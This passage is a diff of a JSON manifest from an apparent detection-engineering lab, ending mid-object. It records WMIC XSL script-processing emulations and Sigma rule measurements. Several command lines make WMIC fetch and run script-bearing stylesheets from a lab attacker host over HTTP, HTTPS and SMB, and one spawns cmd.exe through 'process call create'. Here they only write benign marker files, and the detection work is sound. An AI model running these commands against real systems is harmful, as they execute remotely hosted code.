@@ -1,309 +1,216 @@
 {
+  "schema_version": 2,
   "scenario": {
-    "id": "wmic-remote-xsl-marker",
-    "name": "Remote benign XSL script processing through WMIC",
-    "description": "The signed WMIC utility applied a lab-only remote XSL whose embedded JScript launched cmd.exe to write a marker file.",
+    "id": "wmic-xsl-expanded-adopt-and-measure",
+    "name": "WMIC XSL source/language expansion with adjacent grounded WMI forms",
     "design": "scenarios.md",
-    "attack_mapping": [
-      "T1220"
-    ]
+    "mode": "adopt-and-measure",
+    "attack_mapping": ["T1220", "T1047"],
+    "mapping_note": "Flows 0, 1, 2, 5, and 6 are T1220. Flows 3 and 4 are adjacent T1047/operator use-cases and are not counted as XSL coverage."
   },
   "environment": {
-    "target": {
-      "vmid": 104,
-      "name": "WIN10-ANALYSIS",
-      "address": "192.168.1.52",
-      "os": "Microsoft Windows 10 Enterprise LTSC Evaluation",
-      "version": "10.0.19044",
-      "architecture": "64-bit",
-      "baseline_snapshot": "win_verify_baseline"
-    },
-    "attacker_file_server": {
-      "vmid": 100,
-      "name": "kalivm",
-      "address": "192.168.1.50",
-      "interface_scope": "vmbr1 lab network only",
-      "server": "Python http.server",
-      "bind": "192.168.1.50",
-      "port": 18082,
-      "external_network_used": false
-    },
-    "nsm": {
-      "vmid": 106,
-      "name": "nsm",
-      "address": "10.9.0.20",
-      "analysis_mode": "offline pcap",
-      "helper": "~/bin/nsm-analyze",
-      "zeek_version": "8.2.1",
-      "suricata_version": "7.0.10",
-      "et_open_alert_rules": 52234
-    },
     "proxmox_node": "analysis-proxmox",
-    "sensors": [
-      {
-        "name": "Sysmon",
-        "version": "15.21",
-        "service_status": "Running",
-        "config_path": "C:\\Tools\\sysmon-verification.xml",
-        "config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71",
-        "config_notes": "Verification-grade unfiltered process, network, DNS, file, and registry coverage; LSASS ProcessAccess EID 10 enabled."
+    "target": {"vmid": 104, "name": "WIN10-ANALYSIS", "address": "192.168.1.52", "os": "Windows 10", "baseline_snapshot": "win_verify_baseline", "defender_real_time_protection_enabled": false},
+    "attacker": {"vmid": 100, "name": "kalivm", "address": "192.168.1.50", "listeners": ["tcp/18082 HTTP", "tcp/18083 HTTP", "tcp/18443 HTTPS", "tcp/445 SMB"], "payload_source": "verification/fixtures; all lab-authored and benign"},
+    "nsm": {"vmid": 106, "name": "nsm", "recorded_address": "10.9.0.20", "role": "offline pcap analysis only", "helper": "~/bin/nsm-analyze", "capture_loss_percent_all_runs": 0.0},
+    "sensors": ["Sysmon 15.21 verification configuration", "pktmon full-packet capture", "Zeek", "Suricata", "JA3"],
+    "tool": {"name": "WMIC.exe", "source": "target operating system", "path": "C:\\Windows\\System32\\wbem\\WMIC.exe", "sha256": "DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757", "signature": "valid Microsoft Windows"}
+  },
+  "flows": [
+    {
+      "id": "flow0-http-jscript",
+      "technique": "T1220",
+      "command": "WMIC.exe os get Caption /format:\"http://192.168.1.50:18082/wmic-jscript-http.xsl\"",
+      "account": "NT AUTHORITY\\SYSTEM",
+      "window": ["2026-08-15T11:24:30.4677979Z", "2026-08-15T11:24:33.2959116Z"],
+      "result": {"exit_code": 0, "marker_created": true, "marker_content": "benign-http-jscript"},
+      "dimensions": {
+        "network": {"status": "observed", "signals": ["WMIC-attributed TCP 18082", "HTTP GET and legacy MSIE/Trident user agent"], "packets": 266},
+        "files": {"status": "observed", "signals": ["Internet-cache XSL", "marker"]},
+        "registry": {"status": "observed", "signals": ["JScriptSetScriptStateStarted for wmic.exe"]},
+        "process": {"status": "observed", "signals": ["signed WMIC identity and remote /format: URL"]},
+        "parent_child": {"status": "observed", "signals": ["wmic.exe to cmd.exe"]}
       },
-      {
-        "name": "pktmon",
-        "mode": "full-packet capture",
-        "command": "pktmon.exe start --capture --pkt-size 0 -f C:\\lab\\wmic-xsl-script-processing.etl",
-        "converted_to": "C:\\lab\\wmic-xsl-script-processing.pcapng"
-      }
+      "safety": "evidence/safety/flow0-http-jscript-lab-scope.json: PASS"
+    },
+    {
+      "id": "flow1-local-jscript-standard-user",
+      "technique": "T1220",
+      "command": "WMIC.exe os get Caption /format:\"C:\\Users\\WmicLabUser\\AppData\\Local\\Temp\\wmic-jscript-local.xsl\"",
+      "account": "WIN10-ANALYSIS\\WmicLabUser; non-administrator; medium integrity",
+      "window": ["2026-08-15T11:43:58.6122338Z", "2026-08-15T11:44:01.9877305Z"],
+      "result": {"task_result": 0, "marker_created": true, "marker_content": "benign-local-jscript"},
+      "dimensions": {
+        "network": {"status": "none observed", "signals": [], "assessment": "No attack-attributed HTTP, SMB, TLS, EID 3, or relevant EID 22."},
+        "files": {"status": "observed", "signals": ["user Temp stylesheet", "user Temp marker"], "none_observed": ["Internet-cache XSL"]},
+        "registry": {"status": "observed", "signals": ["per-user JScriptSetScriptStateStarted for wmic.exe"]},
+        "process": {"status": "observed", "signals": ["WMIC /format: local AppData Temp path at medium integrity"]},
+        "parent_child": {"status": "observed", "signals": ["wmic.exe to cmd.exe at medium integrity"]}
+      },
+      "existing_rule_survival": {"survived": ["proc_creation_win_wmic_xsl_script_execution.yml", "win_process_creation_wmic_local_user_writable_xsl.yml", "win_process_creation_wmic_xsl_spawns_shell.yml", "win_registry_set_wmic_jscript_telemetry.yml"], "blind": ["proc_creation_win_wmic_squiblytwo_bypass.yml", "network_zeek_wmic_remote_xsl.yml", "network_suricata_wmic_remote_xsl.yml", "win_file_event_wmic_xsl_cache.yml"], "precision_narrowing": "win_process_creation_wmic_local_user_writable_xsl.yml is the alert/high subset of upstream's broad hunt/low local-XSL coverage"},
+      "safety": "evidence/safety/flow1-local-jscript-lab-scope.json: PASS"
+    },
+    {
+      "id": "flow2-smb-jscript",
+      "technique": "T1220",
+      "command": "WMIC.exe os get Caption /format:\"\\\\192.168.1.50\\wmicxsl\\wmic-jscript-smb.xsl\"",
+      "account": "NT AUTHORITY\\SYSTEM",
+      "window": ["2026-08-15T11:47:12.8782581Z", "2026-08-15T11:47:15.5657501Z"],
+      "result": {"exit_code": 0, "marker_created": true, "marker_content": "benign-smb-jscript"},
+      "dimensions": {
+        "network": {"status": "observed", "signals": ["TCP 445 SMB/NTLM", "guest share mapping", "606-byte XSL open"], "none_observed": ["HTTP"]},
+        "files": {"status": "observed", "signals": ["marker"], "none_observed": ["Internet-cache XSL"]},
+        "registry": {"status": "observed", "signals": ["JScriptSetScriptStateStarted for wmic.exe"]},
+        "process": {"status": "observed", "signals": ["WMIC /format: UNC path"]},
+        "parent_child": {"status": "observed", "signals": ["wmic.exe to cmd.exe"]}
+      },
+      "safety": "evidence/safety/flow2-smb-jscript-lab-scope.json: PASS"
+    },
+    {
+      "id": "flow3-process-call-create",
+      "technique": "T1047",
+      "technique_relationship": "adjacent; not T1220",
+      "command": "WMIC.exe process call create \"cmd.exe /c echo benign-process-create>C:\\lab\\wmic-process-create-marker.txt\"",
+      "account": "NT AUTHORITY\\SYSTEM",
+      "window": ["2026-08-15T11:48:55.0423778Z", "2026-08-15T11:48:57.9174020Z"],
+      "result": {"exit_code": 0, "wmi_return_value": 0, "marker_created": true, "marker_content": "benign-process-create"},
+      "dimensions": {
+        "network": {"status": "none observed", "signals": [], "assessment": "No attack-attributed network activity; unfiltered OS traffic was manifested separately."},
+        "files": {"status": "observed", "signals": ["marker"]},
+        "registry": {"status": "none observed", "signals": []},
+        "process": {"status": "observed", "signals": ["WMIC process call create", "created cmd.exe"]},
+        "parent_child": {"status": "observed", "signals": ["WmiPrvSE.exe to cmd.exe"], "none_observed": ["wmic.exe directly parenting created cmd.exe"]}
+      },
+      "safety": "evidence/safety/flow3-process-create-lab-scope.json: PASS"
+    },
+    {
+      "id": "flow4-node-self",
+      "technique": "T1047",
+      "technique_relationship": "adjacent; self-node cannot establish lateral execution",
+      "command": "WMIC.exe /node:192.168.1.52 os get Caption",
+      "account": "NT AUTHORITY\\SYSTEM",
+      "window": ["2026-08-15T11:55:12.8682074Z", "2026-08-15T11:55:20.6494465Z"],
+      "result": {"exit_code": 0, "caption_returned": true, "negative_network_result": "self address optimized locally"},
+      "dimensions": {
+        "network": {"status": "none observed", "signals": [], "assessment": "No WMIC-attributed TCP/DCOM connection. System NBNS and a local reverse lookup do not prove remote execution."},
+        "files": {"status": "none observed", "signals": []},
+        "registry": {"status": "observed", "signals": ["VBScriptSetScriptStateStarted for benign wmic.exe query"], "assessment": "Negative precision evidence against a broad VBScript registry rule."},
+        "process": {"status": "observed", "signals": ["canonical /node: command line"]},
+        "parent_child": {"status": "none observed", "signals": []}
+      },
+      "failed_credentialed_attempt": "Windows returned: User credentials cannot be used for local connections.",
+      "safety": "evidence/safety/flow4-node-self-lab-scope.json: PASS"
+    },
+    {
+      "id": "flow5-http-vbscript",
+      "technique": "T1220",
+      "command": "WMIC.exe os get Caption /format:\"http://192.168.1.50:18083/wmic-vbscript-http.xsl\"",
+      "account": "NT AUTHORITY\\SYSTEM",
+      "window": ["2026-08-15T12:00:09.8644275Z", "2026-08-15T12:00:16.8498397Z"],
+      "result": {"exit_code": 0, "marker_created": true, "marker_content": "benign-http-vbscript"},
+      "dimensions": {
+        "network": {"status": "observed", "signals": ["WMIC-attributed TCP 18083", "HTTP GET and legacy MSIE/Trident user agent"], "packets": 1564},
+        "files": {"status": "observed", "signals": ["Internet-cache XSL", "marker"]},
+        "registry": {"status": "observed", "signals": ["VBScriptSetScriptStateStarted for wmic.exe"], "none_observed": ["JScriptSetScriptStateStarted"]},
+        "process": {"status": "observed", "signals": ["signed WMIC identity and remote /format: URL"]},
+        "parent_child": {"status": "observed", "signals": ["wmic.exe to cmd.exe"]}
+      },
+      "safety": "evidence/safety/flow5-http-vbscript-lab-scope.json: PASS"
+    },
+    {
+      "id": "flow6-https-jscript",
+      "technique": "T1220",
+      "command": "WMIC.exe os get Caption /format:\"https://certutil.lab:18443/wmic-jscript-https.xsl\"",
+      "account": "NT AUTHORITY\\SYSTEM",
+      "window": ["2026-08-15T12:04:04.2574219Z", "2026-08-15T12:04:08.0075142Z"],
+      "result": {"exit_code": 0, "marker_created": true, "marker_content": "benign-https-jscript"},
+      "dimensions": {
+        "network": {"status": "observed", "signals": ["WMIC-attributed TCP 18443", "TLS 1.2", "SNI certutil.lab", "self-signed certificate", "JA3 and JA3S"], "none_observed": ["plaintext HTTP"]},
+        "files": {"status": "observed", "signals": ["Internet-cache XSL", "marker"]},
+        "registry": {"status": "observed", "signals": ["JScriptSetScriptStateStarted for wmic.exe"]},
+        "process": {"status": "observed", "signals": ["signed WMIC identity and HTTPS /format: URL"]},
+        "parent_child": {"status": "observed", "signals": ["wmic.exe to cmd.exe"]}
+      },
+      "safety": "evidence/safety/flow6-https-jscript-lab-scope.json: PASS"
+    }
+  ],
+  "grounding": {
+    "daily_news_files": 954,
+    "xsl_case_files": 0,
+    "scenario_reference": {"path": "evidence/scenario-reference.json", "technique_references": 1, "builder_lolbas_matches": 0, "builder_lolbas_assessment": "slug-alias false negative; current Wmic.exe entry manually reviewed", "gtfobins_matches": 0, "daily_news_cases": 0},
+    "adjacent_observations": ["wmic process call create", "wmic /node:"],
+    "comparison_counts": {"mshta_files": 33, "rundll32_files": 12},
+    "coverage": {"verified_grounded_use_cases": 5, "grounded_in_scope_use_cases": 6, "ratio": 0.8333333333, "future_in_scope": ["LOLBAS ADS process creation (T1564.004/T1047)"], "excluded_lab_capability": ["true cross-host /node: process creation"]},
+    "conclusion": "Remote WMIC XSL has no current daily-news grounding and is lower priority than grounded WMIC process-create/node forms and the mshta/rundll32 families."
+  },
+  "upstream": {"repository": "SigmaHQ/sigma", "ref": "master", "commit": "3c0d35188942eb6a8c373e4f4973ac7e84116993", "comparison": "evidence/upstream-comparison.md", "rules_compared": [
+    {"id": "8d63dadf-b91b-4187-87b6-34a1114577ea", "path": "rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml", "modified": "2026-01-24"},
+    {"id": "06ce37c2-61ab-4f05-9ff5-b1a96d18ae32", "path": "rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml", "modified": "2022-10-13"},
+    {"id": "05c36dd6-79d6-4a9a-97da-3db20298ab2d", "path": "rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml", "modified": "2026-01-24"},
+    {"id": "526be59f-a573-4eea-b5f7-f0973207634d", "path": "rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml", "modified": "2023-02-14"},
+    {"id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8", "path": "rules/windows/process_creation/proc_creation_win_wmic_susp_process_creation.yml", "modified": "2023-02-14"},
+    {"id": "7773b877-5abb-4a3e-b9c9-fd0369b59b00", "path": "rules/windows/process_creation/proc_creation_win_wmic_remote_execution.yml", "modified": "2025-10-22"}
+  ]},
+  "rule_disposition": {
+    "adopted": [
+      {"path": "sigma/proc_creation_win_wmic_squiblytwo_bypass.yml", "id": "8d63dadf-b91b-4187-87b6-34a1114577ea", "upstream_path": "rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml", "role": "alert", "level": "high", "fp_likelihood": "medium"},
+      {"path": "sigma/proc_creation_win_wmic_xsl_script_execution.yml", "id": "05c36dd6-79d6-4a9a-97da-3db20298ab2d", "upstream_path": "rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml", "role": "hunt", "level": "low", "fp_likelihood": "medium"},
+      {"path": "sigma/proc_creation_win_wmic_process_creation.yml", "id": "526be59f-a573-4eea-b5f7-f0973207634d", "upstream_path": "rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml", "role": "hunt", "level": "low", "fp_likelihood": "medium"},
+      {"path": "sigma/proc_creation_win_wmic_susp_process_creation.yml", "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8", "upstream_path": "rules/windows/process_creation/proc_creation_win_wmic_susp_process_creation.yml", "role": "alert", "level": "high", "fp_likelihood": "medium"},
+      {"path": "sigma/proc_creation_win_wmic_remote_execution.yml", "id": "7773b877-5abb-4a3e-b9c9-fd0369b59b00", "upstream_path": "rules/windows/process_creation/proc_creation_win_wmic_remote_execution.yml", "role": "hunt", "level": "low", "fp_likelihood": "medium"}
     ],
-    "defender": {
-      "real_time_protection_enabled": false,
-      "tamper_protection_enabled": false
-    },
-    "collector": {
-      "path": "C:\\Tools\\collect-run.ps1",
-      "window_start": "2026-08-10T01:46:07.331Z",
-      "window_end": "2026-08-10T01:46:14.378Z",
-      "event_count": 1217
-    }
+    "locally_authored": [
+      {"path": "sigma/win_process_creation_wmic_local_user_writable_xsl.yml", "id": "5b4b1f39-0964-4bf9-b1de-8226f262d036", "proven_gap": "unmeasured precision claim: alert/high AppData Temp plus XSL subset of upstream's broad local hunt", "role": "alert", "level": "high", "fp_likelihood": "low"},
+      {"path": "sigma/win_process_creation_wmic_xsl_spawns_shell.yml", "id": "ac2c0a8c-7e39-45b5-96a0-fc8481856380", "proven_gap": "execution consequence and parent-child dimension absent upstream", "role": "alert", "level": "high", "fp_likelihood": "low"},
+      {"path": "sigma/win_file_event_wmic_xsl_cache.yml", "id": "e329114d-ed5e-45bc-a4ae-85f4f8394159", "proven_gap": "file-only cache evidence; dead service-qualified logsource repaired", "role": "alert", "level": "high", "fp_likelihood": "low"},
+      {"path": "sigma/win_registry_set_wmic_jscript_telemetry.yml", "id": "59a1805f-300b-458f-b23b-b8406a047e33", "proven_gap": "actual JScript initialization independent of delivery; dead service-qualified logsource repaired", "role": "alert", "level": "high", "fp_likelihood": "low"},
+      {"path": "sigma/network_zeek_wmic_remote_xsl.yml", "id": "09524123-3892-4af2-b9c4-56dc6304ae58", "proven_gap": "network-only plaintext retrieval when endpoint telemetry is absent", "role": "hunt", "level": "low", "fp_likelihood": "medium"},
+      {"path": "sigma/network_suricata_wmic_remote_xsl.yml", "id": "7168c3d7-1330-4970-9c28-9bbc92f49487", "proven_gap": "network-only plaintext retrieval when endpoint telemetry is absent", "role": "hunt", "level": "low", "fp_likelihood": "medium"}
+    ],
+    "not_authored": [{"dimension": "TLS/JA3", "reason": "observed fingerprints identify reusable stack components, not WMIC-specific behavior"}, {"dimension": "broad VBScript registry", "reason": "benign /node: query produced the same script-start telemetry"}],
+    "precision_measurement": "evidence/rule-measurements.json"
   },
-  "tool": {
-    "name": "WMIC.exe",
-    "type": "Microsoft-signed Windows living-off-the-land binary",
-    "source": "Built into the target operating system",
-    "binary": {
-      "path": "C:\\Windows\\System32\\wbem\\WMIC.exe",
-      "size_bytes": 576512,
-      "sysmon_file_version": "10.0.19041.5794 (WinBuild.160101.0800)",
-      "original_filename": "wmic.exe",
-      "sha256": "DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757",
-      "signature_status": "Valid",
-      "signer": "Microsoft Windows"
-    },
-    "staged_file": {
-      "name": "benign.xsl",
-      "content": "Benign XSL with embedded JScript that launches cmd.exe only to write a marker and returns benign text",
-      "size_bytes": 571,
-      "sha256": "B0390CCFDBC5D4DB943EC83B0FBD8240D959EB4248507D79B3594368414BD970"
-    },
-    "commands": [
-      {
-        "working_directory": "C:\\Windows\\System32",
-        "invocation": "C:\\Windows\\System32\\wbem\\WMIC.exe os get Caption /format:\"http://192.168.1.50:18082/benign.xsl\"",
-        "account": "NT AUTHORITY\\SYSTEM",
-        "privilege": "System integrity",
-        "process_id": 5224,
-        "process_guid": "{d6daef74-2d62-6a79-9400-000000000b00}",
-        "exit_code": 0,
-        "started_at": "2026-08-10T01:46:10.3315182Z",
-        "ended_at": "2026-08-10T01:46:11.3628034Z",
-        "stdout": "benign-wmic-xsl",
-        "marker_path": "C:\\lab\\wmic-xsl-marker.txt",
-        "marker_content": "benign-wmic-xsl-marker",
-        "marker_created": true
-      }
-    ]
-  },
-  "observed_techniques": [
-    {
-      "id": "T1220",
-      "name": "XSL Script Processing",
-      "observation": "WMIC fetched a remote XSL via /format, initialized JScript through ms:script, and spawned cmd.exe from the stylesheet."
-    }
-  ],
-  "observed_signals": {
-    "network": {
-      "status": "observed",
-      "event_id_3": 1,
-      "event_id_22": 0,
-      "pcapng_sha256": "25774880406F4E72DFF6155AE9E4DBAEB911C5BA39416888A9A6954D37CB8FC2",
-      "packet_count": 346,
-      "capture_loss_percent": 0.0,
-      "zeek_http_records": 1,
-      "assessment": "Sysmon linked the TCP connection to WMIC. Zeek and Suricata decoded a successful XSL GET with the legacy MSIE 7.0/Trident 7.0 User-Agent. DNS was absent because the URL used an IP literal."
-    },
-    "files": {
-      "status": "observed",
-      "event_id_11_relevant": 3,
-      "event_id_23_relevant": 1,
-      "assessment": "WMIC cached the XSL under the SYSTEM INetCache. Two script invocations wrote the same marker, producing two creates and one overwrite-delete event."
-    },
-    "registry": {
-      "status": "observed",
-      "event_id_12_relevant": 15,
-      "event_id_13_relevant": 13,
-      "event_id_14_relevant": 0,
-      "assessment": "The strongest registry signal was JScriptSetScriptStateStarted beneath Windows Script telemetry for wmic.exe; generic WMI, Internet Settings, and notification writes were not promoted alone."
-    },
-    "process_identity": {
-      "status": "observed",
-      "event_id_1": 1,
-      "assessment": "Sysmon captured WMIC identity, remote /format XSL URL, hashes, SYSTEM user, and System integrity."
-    },
-    "parent_child": {
-      "status": "observed",
-      "assessment": "PowerShell launched WMIC through the controlled wrapper. The XSL transform caused WMIC to launch cmd.exe twice; conhost.exe was also a normal child."
-    }
-  },
-  "evidence": [
-    {
-      "path": "evidence/endpoint-signals.json",
-      "event_ids": [1, 3, 5, 11, 12, 13, 23],
-      "description": "Sanitized process, ancestry, endpoint network, file, and registry fields."
-    },
-    {
-      "path": "evidence/network-signals.json",
-      "description": "Sanitized full-packet capture metadata and Zeek/Suricata HTTP findings."
-    }
-  ],
   "sigma": [
-    {
-      "path": "sigma/win_process_creation_wmic_remote_xsl.yml",
-      "tier": 1,
-      "role": "primary",
-      "logsource": "windows/process_creation",
-      "status": "experimental",
-      "fp_likelihood": "low",
-      "recommended_role": "alert",
-      "level": "high",
-      "precision_measurement": {
-        "measured": true,
-        "fp_count": 0,
-        "fp_share_of_category_percent": 0.0,
-        "category_denominator": 23695,
-        "detection_hit": true,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
-      }
-    },
-    {
-      "path": "sigma/win_process_creation_wmic_xsl_spawns_shell.yml",
-      "tier": 1,
-      "role": "parent-child",
-      "logsource": "windows/process_creation",
-      "status": "experimental",
-      "fp_likelihood": "low",
-      "recommended_role": "alert",
-      "level": "high",
-      "precision_measurement": {
-        "measured": true,
-        "fp_count": 0,
-        "fp_share_of_category_percent": 0.0,
-        "category_denominator": 23695,
-        "detection_hit": true,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
-      }
-    },
-    {
-      "path": "sigma/network_zeek_wmic_remote_xsl.yml",
-      "tier": 1,
-      "role": "network",
-      "logsource": "zeek/http",
-      "status": "experimental",
-      "fp_likelihood": "medium",
-      "recommended_role": "alert",
-      "level": "high",
-      "precision_measurement": {
-        "measured": false,
-        "reason": "not-testable-on-evtx",
-        "fp_count": null,
-        "fp_share_of_category_percent": null,
-        "category_denominator": null,
-        "detection_hit": null,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
-      }
-    },
-    {
-      "path": "sigma/network_suricata_wmic_remote_xsl.yml",
-      "tier": 1,
-      "role": "network",
-      "logsource": "suricata/http",
-      "status": "experimental",
-      "fp_likelihood": "medium",
-      "recommended_role": "alert",
-      "level": "high",
-      "precision_measurement": {
-        "measured": false,
-        "reason": "not-testable-on-evtx",
-        "fp_count": null,
-        "fp_share_of_category_percent": null,
-        "category_denominator": null,
-        "detection_hit": null,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
-      }
-    },
-    {
-      "path": "sigma/win_file_event_wmic_xsl_cache.yml",
-      "tier": 1,
-      "role": "file",
-      "logsource": "windows/sysmon/file_event",
-      "status": "experimental",
-      "fp_likelihood": "low",
-      "recommended_role": "alert",
-      "level": "high",
-      "precision_measurement": {
-        "measured": true,
-        "fp_count": 0,
-        "fp_share_of_category_percent": 0.0,
-        "category_denominator": 542441,
-        "detection_hit": false,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
-      }
-    },
-    {
-      "path": "sigma/win_registry_set_wmic_jscript_telemetry.yml",
-      "tier": 2,
-      "role": "registry-depth",
-      "logsource": "windows/sysmon/registry_set",
-      "status": "experimental",
-      "fp_likelihood": "low",
-      "recommended_role": "alert",
-      "level": "high",
-      "precision_measurement": {
-        "measured": true,
-        "fp_count": 0,
-        "fp_share_of_category_percent": 0.0,
-        "category_denominator": 1151508,
-        "detection_hit": false,
-        "corpus": "evtx-baseline v0.8.4",
-        "repo_commit": "7a20965"
-      }
-    }
+    {"path": "sigma/proc_creation_win_wmic_squiblytwo_bypass.yml", "id": "8d63dadf-b91b-4187-87b6-34a1114577ea", "origin": "adopted SigmaHQ master", "logsource": "windows/process_creation", "fp_likelihood": "medium", "recommended_role": "alert", "level": "high", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 23695, "measured_fp_likelihood_floor": "low", "auditor_fp_likelihood": "medium", "detection_hit": true, "verdict": "pass", "corpus": "evtx-baseline v0.8.4", "gate_commit": "80d5cb3266cc22640cd29266c9545d4e801fd742"}},
+    {"path": "sigma/proc_creation_win_wmic_xsl_script_execution.yml", "id": "05c36dd6-79d6-4a9a-97da-3db20298ab2d", "origin": "adopted SigmaHQ master", "logsource": "windows/process_creation", "fp_likelihood": "medium", "recommended_role": "hunt", "level": "low", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 23695, "measured_fp_likelihood_floor": "low", "detection_hit": false, "verdict": "no-corpus-coverage", "verdict_reason": "no positive public corpus sample; flow 1 supplies lab validation", "corpus": "evtx-baseline v0.8.4", "auditor_adjustment": "broad arbitrary local /format values can include approved custom reporting"}},
+    {"path": "sigma/win_process_creation_wmic_local_user_writable_xsl.yml", "id": "5b4b1f39-0964-4bf9-b1de-8226f262d036", "origin": "local precision-gap narrowing of upstream 05c36dd6", "logsource": "windows/process_creation", "fp_likelihood": "low", "recommended_role": "alert", "level": "high", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 23695, "measured_fp_likelihood_floor": "low", "detection_hit": false, "verdict": "no-corpus-coverage", "verdict_reason": "lab positive exists; public attack corpus has no positive sample", "corpus": "evtx-baseline v0.8.4"}},
+    {"path": "sigma/win_process_creation_wmic_xsl_spawns_shell.yml", "id": "ac2c0a8c-7e39-45b5-96a0-fc8481856380", "origin": "existing local dimension", "logsource": "windows/process_creation", "fp_likelihood": "low", "recommended_role": "alert", "level": "high", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 23695, "measured_fp_likelihood_floor": "low", "detection_hit": true, "verdict": "pass", "corpus": "evtx-baseline v0.8.4"}},
+    {"path": "sigma/win_file_event_wmic_xsl_cache.yml", "id": "e329114d-ed5e-45bc-a4ae-85f4f8394159", "origin": "existing local dimension; repaired logsource", "logsource": "windows/file_event", "fp_likelihood": "low", "recommended_role": "alert", "level": "high", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 542441, "measured_fp_likelihood_floor": "low", "detection_hit": true, "verdict": "pass", "corpus": "evtx-baseline v0.8.4"}},
+    {"path": "sigma/win_registry_set_wmic_jscript_telemetry.yml", "id": "59a1805f-300b-458f-b23b-b8406a047e33", "origin": "existing local dimension; repaired logsource", "logsource": "windows/registry_set", "fp_likelihood": "low", "recommended_role": "alert", "level": "high", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 1151508, "measured_fp_likelihood_floor": "low", "detection_hit": false, "verdict": "no-corpus-coverage", "verdict_reason": "lab positive exists; public attack corpus has no positive sample", "corpus": "evtx-baseline v0.8.4"}},
+    {"path": "sigma/proc_creation_win_wmic_process_creation.yml", "id": "526be59f-a573-4eea-b5f7-f0973207634d", "origin": "adopted SigmaHQ master", "logsource": "windows/process_creation", "fp_likelihood": "medium", "recommended_role": "hunt", "level": "low", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 23695, "measured_fp_likelihood_floor": "low", "detection_hit": true, "verdict": "pass", "corpus": "evtx-baseline v0.8.4", "auditor_adjustment": "broad legitimate administration population justifies medium despite zero baseline matches"}},
+    {"path": "sigma/proc_creation_win_wmic_susp_process_creation.yml", "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8", "origin": "adopted SigmaHQ master", "logsource": "windows/process_creation", "fp_likelihood": "medium", "recommended_role": "alert", "level": "high", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 23695, "measured_fp_likelihood_floor": "low", "auditor_fp_likelihood": "medium", "detection_hit": true, "verdict": "pass", "corpus": "evtx-baseline v0.8.4", "gate_commit": "80d5cb3266cc22640cd29266c9545d4e801fd742"}},
+    {"path": "sigma/proc_creation_win_wmic_remote_execution.yml", "id": "7773b877-5abb-4a3e-b9c9-fd0369b59b00", "origin": "adopted SigmaHQ master", "logsource": "windows/process_creation", "fp_likelihood": "medium", "recommended_role": "hunt", "level": "low", "precision_measurement": {"measured": true, "fp_count": 0, "fp_share_of_category_percent": 0.0, "category_denominator": 23695, "measured_fp_likelihood_floor": "low", "detection_hit": false, "verdict": "no-corpus-coverage", "corpus": "evtx-baseline v0.8.4", "auditor_adjustment": "legitimate inventory plus self-node negative result justify medium/hunt"}},
+    {"path": "sigma/network_zeek_wmic_remote_xsl.yml", "id": "09524123-3892-4af2-b9c4-56dc6304ae58", "origin": "existing local network dimension", "logsource": "zeek/http", "fp_likelihood": "medium", "recommended_role": "hunt", "level": "low", "precision_measurement": {"measured": false, "reason": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "verdict": "not-testable-on-evtx", "corpus": "evtx-baseline v0.8.4"}},
+    {"path": "sigma/network_suricata_wmic_remote_xsl.yml", "id": "7168c3d7-1330-4970-9c28-9bbc92f49487", "origin": "existing local network dimension", "logsource": "suricata/http", "fp_likelihood": "medium", "recommended_role": "hunt", "level": "low", "precision_measurement": {"measured": false, "reason": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "verdict": "not-testable-on-evtx", "corpus": "evtx-baseline v0.8.4"}}
   ],
+  "safety": {
+    "scenario_scope_pre_run": {"path": "evidence/safety/scenario-scope-pre-run.json", "verdict": "REVIEW", "critical_findings": 0, "review": "lab-only certutil.lab name declared in Scope"},
+    "scenario_scope_final": {"path": "evidence/safety/scenario-scope-final.json", "verdict": "PASS", "critical_findings": 0},
+    "accepted_post_run_verdicts": {"flow0": "PASS", "flow1": "PASS", "flow2": "PASS", "flow3": "PASS", "flow4": "PASS", "flow5": "PASS", "flow6": "PASS"},
+    "failed_attempts": "Retained and explained in evidence/safety/README.md; all were rolled back. One initial self-name checker false positive is preserved beside its supported local-name readjudication PASS.",
+    "attack_destinations": ["192.168.1.50", "192.168.1.52"],
+    "forbidden_destinations_used": false
+  },
+  "audit": {
+    "gate_iteration": 2,
+    "measured_commit": "80d5cb3266cc22640cd29266c9545d4e801fd742",
+    "decision": "PASS",
+    "exit_code": 0,
+    "blocking_count": 0,
+    "harness": {"rule_count": 11, "blocking_count": 0, "pass": 5, "no_corpus_coverage": 4, "not_testable_on_evtx": 2},
+    "safety_verdict": "safe",
+    "scenario_verdict": "expand",
